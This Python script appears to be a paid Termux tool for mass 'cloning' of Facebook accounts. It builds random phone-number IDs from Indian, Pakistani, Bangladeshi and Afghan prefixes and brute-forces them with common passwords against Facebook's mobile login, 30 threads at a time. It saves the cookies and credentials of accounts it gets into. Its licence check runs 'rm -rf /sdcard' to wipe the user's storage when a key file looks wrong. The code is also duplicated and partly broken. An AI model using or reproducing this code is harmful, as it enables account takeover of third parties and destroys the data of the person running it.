#created by hamii
#team name hbf
#tottaly written by hamid Khawaja
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
from time import sleep
from os import system
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
from sys import exit as exit
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
 
###----------[ IMPORT LIBRARY ]---------- ###
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Hamii.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
ugen = []
 
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
HBF = '{ HBF }'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
hamii2 = "\033[1;33mâž¤\033[1;32mâž¤\x1b[0m"
for xd in range(10000):
    x='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{x} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock=open('ua.html','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').read().splitlines()
 
loop = 0
cp = []
ok = []
twf = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
logo =f"""{WHITE}


  _____            _  _______ ____  
 |  __ \     /\   | |/ /_   _|  _ \ 
 | |__) |   /  \  | ' /  | | | |_) |
 |  _  /   / /\ \ |  <   | | |  _ < 
 | | \ \  / ____ \| . \ _| |_| |_) |
 |_|  \_\/_/    \_\_|\_\_____|____/ 
                                    
                                    

ðŸ”¥
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘ Creator  : RAKIB KHAN                       â•‘
â•‘ Github   : https://github.com/F3ogbaba03  â•‘
â•‘ Facebook : RAKIB KHAN                            â•‘
â•‘ NOTE     :              Paid ToolðŸ˜“                         â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•   """
 
 
def linex():
    print(f'{RED}============================F3OG&MOTU TRICKER==============================')
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mD.H.B-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mD.H.B-CP.txt' %
              (H, P, str(len(cp))))
        input("\x1b[1;97mPRESE ENTER TO BACK MENU ")
        xyz()
#---------------------[LOOP MENU]---------------------#
loop = 0
cp = []
ok = []
twf = []
 
 
 
def my_tool_security():
    os.system("clear")
    print(logo)
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : RAKIB KHAN ")
    print("\t  Fb page  : RAKIBS COMMUNITY ")
    print("\t  Github   : RAKIB48")
    print(c, 45*"-")
    print(47*"-")
    try:
        token_one=open(key_save_one,'r').read()
    except(requests.exceptions.ConnectionError):
        print(red," please on internet wifi/data ")
        exit()
    except(FileNotFoundError):
        os.system('termux-setup-storage')
        print("\t Welcome To D.H.B Tool ....")
        time.sleep(2)
        iid_1=uuid.uuid1().hex[:7].upper()
        iid_2=uuid.uuid1().hex[:7].upper()
        open(key_save_one,'w').write(iid_1)
        open(key_save_two,'w').write(iid_2)
        my_tool_security()
    except(KeyError,OSError,IOError):
        os.system("termux-setup-storage")
        print("\n Hey user we are facing issues with your device")
        print(" Give termux storage permission and try again")
        exit()
    token_two=open(key_save_two,'r').read()
    if len(token_two)<=1:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /sdcard")
        os.system('rm -rf '+key_save_one+'')
        exit()
    else:
        pass
    if len(token_one)<=1:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /sdcard")
        os.system('rm -rf '+key_save_one+'')
        exit()
    else:
        pass
    if len(token_two)>=8:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /sdcard")
        os.system('rm -rf '+key_save_one+'')
        exit()
    else:
        f_token=token_one+token_two
    my_server=requests.get("https://www.facebook.com/100042882302159/posts/pfbid02ZG78gghaeEdjhr1Vo6MyvoHcPZkrCZcpH3ycnoEsswzLdVF5aZ8GueSYoHZxazael/?app=fbl").text
    if f_token in my_server:
        xyz()
    else:
        _help=uuid.uuid1().hex[:6].upper()+"=RAKIB"
        print("\n\t     [ Hello User ]\n")
        print(" This is paid tool you need subscription to use")
        print(" for buy subscription press enter an msg")
        print(" to RSA Programmer fb page and your key")
        print(" otherwise msg on this whatsapp 01786341140 \n")
        print(" Copy your Key :",gre,f_token+_help,wit,"\n")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100076019100675")
        exit()
 
 
#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(57*'-')
 
 
#---------------------[MAIN MENU]---------------------#

                                                    
def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/F3ogbaba03/aproobe.txt/main/aaprove.txt').text
  
 

  os.system(" clear")                          
  print("""\033[1;37m


  _____            _  _______ ____  
 |  __ \     /\   | |/ /_   _|  _ \ 
 | |__) |   /  \  | ' /  | | | |_) |
 |  _  /   / /\ \ |  <   | | |  _ < 
 | | \ \  / ____ \| . \ _| |_| |_) |
 |_|  \_\/_/    \_\_|\_\_____|____/ 
                                    
                                    

 ðŸ”¥
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘ Creator  : RAKIB KHAN                                 â•‘
â•‘ Github   : https://github.com/F3ogbaba03  â•‘
â•‘ Facebook : RAKIB KHAN  ðŸ™‚â¤ï¸                â•‘
â•‘ Brothers :            RAKIB YT                              â•‘
â•‘ NOTE     :   Paid ToolðŸ˜“                                    â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  """)                                           
  print("\t \033[1;37m  FIRST GET APPROVEL\033[1;37m ")
  print("")
  print(" \033[1;37m  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
  print("")
  print("\x1b[1;97m   contract Admin to Buy this Tools                                                               ");time.sleep (0.1) 
  print("")
  print("\033[1;37     YOUR  KEY : "+id)
  print("")
  print("\033[1;37m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
  print("")
  print("  Follow Admin Facebook ID,,,,,,,,,,,,,,,,,    ");time.sleep(1)
  os.system('xdg-open https://www.facebook.com/srabon.sheikh.522')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/F3ogbaba03/aproobe.txt/main/aaprove.txt").text
    if id in httpCaht:
      print("\033[1;97m   YOUR TOKEN APROVED ðŸ¥€ ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      print("\x1b[1;97m    Sorry Bro Token Key not AprovedðŸ˜“")
      print("    Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://wa.me/+8801935845884')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	menu_apikey()
#() 



def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/F3ogbaba03/aproobe.txt/main/aaprove.txt').text
  
 

  os.system(" clear ")
  print(logo)
  print(" Wait bro,,,, ")
  print(" Chacking Your Aproval ")
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/F3ogbaba03/aproobe.txt/main/aaprove.txt").text
    if id in httpCaht:
      print("\033[1;97m   YOUR TOKEN APROVED ðŸ¥€ ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print("\x1b[1;97m    Sorry Bro Your Token not AprovedðŸ˜“ ")
      print("    Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://wa.me/+8801935845884')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__': 
    	print(logo)
    	menu_apikey()

def menu_apikey():
    os.getuid
    
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f'{WHITE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
    print(f" {WHITE}TODAY DATE & TIME     :{WHITE} {ha}/{bu}/{ta} {WHITE}~> {WHITE} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print(f"{WHITE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    print(f"{WHITE}[01] {WHITE}RANDOM CLONE")
    print(f"{WHITE}[02] {WHITE}OWNER FB ID")
    print(f"{WHITE}[03] {WHITE}OWNER WHATSAPP")
    print(f"{WHITE}[00] {WHITE}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;37m========================================================")
    hamii = input("[âˆš] CHOOSE : ")
    if hamii in ["1","01"]:
        os.system("xdg-open https://www.facebook.com/profile.php?id=100076019100675")
        password()
           
    elif hamii in ["2","02"]:
        os.system("xdg-open https://www.facebook.com/profile.php?id=100076019100675");xyz()
    elif hamii in ["3","03"]:
        os.system("xdg-open https://wa.me/+8801786341140")
        xyz()    
    elif hamii in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()
#---------------------[PASS DEF]---------------------#
def password():
    
    os.system("clear")
    print(logo)
    print('       \x1b[97m[\033[37;41m  C l O NE    M E N U   \033[0;m] ')
    print(f"")
    print(f"{WHITE}[01] {WHITE} INIDA   {WHITE}  [ PRO]")
    print(f"{WHITE}[02] {WHITE} PAKISTAN  {WHITE}[ PRO]")
    print(f"{WHITE}[03] {WHITE} BANGLADESH{WHITE}[ PRO]")
    print(f"{WHITE}[04] {WHITE} AFGANISTAN {WHITE}[ PRO]")
    print(f'{WHITE}=================F3OG&MOTU TRICKER================================')
    print("")
    passX = input(f" {WHITE}CHOOSE{hamii2} : ")
    if passX in ['1','01']:
        os.system("xdg-open https://www.facebook.com/profile.php?id=100076019100675")
        password1()
    elif passX in ['2','02']:
        os.system("xdg-open https://www.facebook.com/profile.php?id=100076019100675")
        password2()
    elif passX in ['3','03']:
        os.system("xdg-open https://www.facebook.com/profile.php?id=100076019100675")
        password5()
    elif passX in ['4','04']:
        os.system("xdg-open https://www.facebook.com/profile.php?id=100076019100675")
        password6()
    else:
        xyz()
#---------------------[CLONING MAIN DEF]---------------------#
#---------------------[PASS 1 CLONING MENU]---------------------#
def password1():
    
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    print(f'{WHITE}==========================================================')
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :ðŸ‘‡\033[0;m]")
    print(f"")
    print(f" 901649 ,984113 ,701236 ,983112")
    print("")
    print(f'{WHITE}==========================================================')
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {WHITE}"+tl+" ~> [ Pro]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {WHITE}INDIA")
        print(f" {WHITE}NUMBER YOU PUT        : {WHITE}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{WHITE} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{WHITE}==========================================================')
        for love in user:
            uid = code+love
            mk = uid[:6]
            pwx = [love,mk]
            manshera.submit(free1,uid,pwx,tl)
def free1(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[FROG_BABA ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
})
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                print('\r\033[1;32m[RAKIB-OK] '+uid+' [âˆš] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[RAKIB] '+uid+' [~] '+ps+' ')
                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[RAKIB-CP] '+uid+' [Ã—] '+ps+ ' ')
                    open('/sdcard/RAKIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        checks(ok,cp)
    except:
        pass
 
 
 
 
 
 
#---------------------[PASS 2 CLONING MENU]---------------------#
def password2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    print(f'{WHITE}==========================================================')
    print(f"        \x1b[97m[\033[95;47mEXAMPLE :ðŸ‘‡ CHOICE YOUR COUNTRY CODE \033[0;m]")
    print(f"")
    print(f" 92306,92315,92316,92309")
    print("")
    print(f'{WHITE}==========================================================')
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {WHITE}"+tl+" ~> [ Pro]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {WHITE}PAKISTAN")
        print(f" {WHITE}NUMBER YOU PUT        : {WHITE}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{WHITE} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{WHITE}==========================================================')
        for love in user:
                    uid = code+love
                    pwx = [love,'khan123','khan1122','Khankhan','khan786','ali123','ali786','786786']
                    manshera.submit(free1,uid,pwx,tl)
def free1(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[RAKIB ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
})
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                print('\r\033[1;32m[RAKIB-OK] '+uid+' [âˆš] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[RAKIB] '+uid+' [~] '+ps+' ')
                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[RAKIB-CP] '+uid+' [Ã—] '+ps+ ' ')
                    open('/sdcard/RAKIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        checks(ok,cp)
    except:
        pass
#---------------------[PASS 5 CLONING MENU]---------------------#
def password5():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    print(f'{WHITE}==========================================================')
    print(f"        \x1b[97m[\033[95;42mEXAMPLE TRY 1:ðŸ‘‡\033[0;m]")
    print(f"")
    print(f" 88017 , 88019 , 88018")
    print(f"        \x1b[97m[\033[95;42mEXAMPLE TRY 2 :ðŸ‘‡\033[0;m]")
    print(f"")
    print(f" 017 , 019 , 018")
    print("")
    print(f'{WHITE}==========================================================')
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {WHITE}"+tl+" ~> [ Pro]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {WHITE}BANGLADESH")
        print(f" {WHITE}NUMBER YOU PUT        : {WHITE}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{WHITE} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{WHITE}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love,'786786','BANGLADESH','khan123']
            manshera.submit(free1,uid,pwx,tl)
def free1(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[RAKIB ðŸ”¥] [%s] \33[1;97m[OK:%s{RAKIB2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
})
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                print('\r\033[1;32m[RAKIB-OK] '+uid+' [âˆš] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[RAKIB] '+uid+' [~] '+ps+' ')
                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[RAKIB-CP] '+uid+' [Ã—] '+ps+ ' ')
                    open('/sdcard/RAKIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        checks(ok,cp)
    except:
        pass
#---------------------[MAIN CLONING DEF 2]---------------------#
 
 
def password6():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    print(f'{WHITE}==========================================================')
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :ðŸ‘‡\033[0;m]")
    print(f"")
    print(f" 93778 ,93762 ,93883 ,93811")
    print("")
    print(f'{WHITE}==========================================================')
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {WHITE}"+tl+" ~> [ Pro]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {WHITE}AFGANISTAN")
